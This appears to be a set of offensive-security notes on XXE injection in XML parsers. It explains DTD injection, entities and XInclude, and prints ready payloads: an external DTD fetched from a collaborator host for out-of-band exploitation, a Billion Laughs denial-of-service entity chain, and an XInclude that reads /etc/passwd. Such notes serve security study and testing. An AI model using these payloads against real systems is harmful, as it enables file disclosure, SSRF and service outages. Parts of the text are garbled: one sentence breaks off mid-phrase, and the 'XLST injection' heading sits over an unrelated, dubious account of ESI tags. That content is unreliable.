XML External Entity injection occurs when an XML parser processes external entities in an unsafe way. This vulnerability type also includes XInclude abuse.

## DTD injection

> An injection of DTD is a classical way of exploiting XXE. If it's not applicable, move to XInclude section.

An XML document starts with XML declaration with the ==Document Type Declaration (DTD)== after it:
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
```

Usually internal DTD is used, which means that data structures are defined inline within `DOCTYPE` tag.

A DTD can be also external, which means that one can specify a link to a dedicated server with entity declarations on it:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://collab/schema.dtd"> %xxe;]>
```

When the XML parser is capable of network interactions, the exploitation way is usually ==out-of-band (OOB)==. If it's not applicable, focus on the ==error-based== methods.

And, finally, DTDs can be local, or, in other words, stored somewhere on the same host. These DTDs are used for error-based exploitation. You either need to bruteforce a valid file, or use some of OS-specific

https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/

### Entities

DTD contains both ==external and internal custom entities==. 

Internal entities are mostly harmless. They can only be used as a reflection sink for client side attacks or cause DoS: 

```xml
<!-- Billion Laugh Attack -->

<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
Another variant with parameter entities exists - [Parameters Laugh Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#parameters-laugh-attack).

External entites contain `SYSTEM` or `PUBLIC` keyword and can lead to SSRF or RCE.

An entity can be ==general or parametrized==. A general entity is referenced inside the document body with the following notation:
```xml
<!DOCTYPE root [ <!ENTITY test SYSTEM "http://example.com/payload"> ]> 
<root>&test;</root>
```
While a parametrized entity is defined and used only within DTD:
```xml
<!DOCTYPE root [ 
<!ENTITY % ext SYSTEM "http://example.com/payload">
%ext; ]
> 
<root></root>
```
Notice that metacharacters like `&gt;` also represent a general entity.
## XInclude

XInclude is a generic mechanism for merging XML files.

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## XLST injection

Another way of including payload inside an XML document body is using ESI tags. These are commonly used by Apache on a server side.

https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/
## Obfuscation

You can modify the document encoding in its header - `<?xml version="1.0" encoding="utf-8"?>`

https://mohemiv.com/all/evil-xml/
